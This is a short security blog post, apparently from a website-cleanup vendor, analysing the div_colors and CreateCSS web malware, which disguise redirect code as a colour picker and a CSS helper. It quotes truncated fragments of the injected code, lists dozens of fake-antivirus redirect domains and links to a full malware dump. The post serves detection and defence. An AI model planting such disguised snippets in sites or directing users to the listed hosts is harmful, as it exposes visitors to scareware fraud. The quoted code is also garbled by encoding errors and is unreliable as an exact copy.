Malware week: The div_colors, CreateCSS and others

We are starting to see an interesting trend regarding how the latest web-based malware is being distributed. Instead of heavily encoding the malicious code on the infected web sites, attackers are now trying to make it look like legitimate code.
div_colors
For example, the div_colors malware that infected a lot of osCommerce sites, looks like a javascript color picker.  This is how it looks like in an infected site:

if (typeof(redef_colors)==â€undefinedâ€) {
varÂ div_colorsÂ =Â new Array("#4b8272â€², "#81787fâ€™, â€˜#832f83â€², â€˜#887f74â€², â€˜#4c3183â€², â€˜#748783â€², â€˜#3e7970â€², â€˜#857082â€², â€˜#728178â€², â€˜#7f8331â€², â€˜#2f8281â€², â€˜#724c31â€²,Â â€˜#778383â€², â€˜#7f493eâ€™, â€˜#3e7a84â€², â€˜#82837eâ€™, â€˜#40403dâ€™, â€˜#727e7câ€™, â€˜#3e7982â€², â€˜#3e7980â€², â€˜#847481â€², â€˜#883d7câ€™, â€˜#787d3dâ€™, â€˜#7f777fâ€™, "#314d00â€²);

The idea here is anyone looking for it may mistake it for a legitimate color picker script, or something non-malicious. In fact, in the osCommerce forums many people said it was non-maliciousâ€¦ Instead, the code redirects the site to a fake anti virus from multiple intermediaries:

againstvirusxpsoft.com
againstvirysscanxp.com
antiagencyxpsoft.com
antivirixpsoft.com
antivirusxpeasy.com
antivirusxphard.com
antivirusxpinfected.com
antivirusxpsoft.com
antivirusxpsoftcentral.com
antivirusxpsoftonline.com
civilianssoft.com
civiliansxp.com
egyptantivirusxp.com
freeantivirusxp.com
freescanantiagency.com
freescanantivirus.com
gadhafixp.com
infectedvirusxpsoft.com
myantivirusxpsoft.com
myscanantivwin.com
myxpscanantivirus.com
protestersantivirusxp.com
protestersantivirusxpsoft.com
protesterscanantivirus.com
protesterscanantivirusxp.com
protestersscanantivirus.com
protestersvirusxpsoft.com
scanantiagencyfree.com
scanantivirixp.com
scanantivirusfree.com
scanantivirusfreeonline.com
theantivirusxpsoft.com
thefreescanantivirus.com
thescanantivirusfree.com
thexpscanantivirus.com
webantivirusxpsoft.com
webprotectionsoft.com
webxpscanantivirus.com
xpexamineantivirus.com
xpscanagainstvirus.com
xpscanantiagency.com
xpscanantibacteria.com
xpscanantiviri.com
xpscanantivirus.com
xpscanantiviruscentral.com
xpscanantivirusonline.com
xpscanantivirusprotesters.com
xpscanwarvirus.com
xpseeantivirus.com

CreateCSS
Another one that is confusing a lot of users is the CreateCSS malware. It looks like this in an infected site:

<script>functionÂ createCSS(selector,declaration)
{
var ua=navigator.userAgent.toLowerCase();
var isIE=(/msie/.test(ua))&&!(/opera/.test(ua))&&(/win/.te..

This is very easy to confuse with a CSS function or something like that (you can see the full malware dump here: http://193.105.240.93/data/97.txt).
An interesting shift regarding how the attackers are infecting web sites. But we will keep watching them ğŸ™‚

Site hacked? Infected with malware? Blacklisted? Yes, we clean up and monitor web sites.
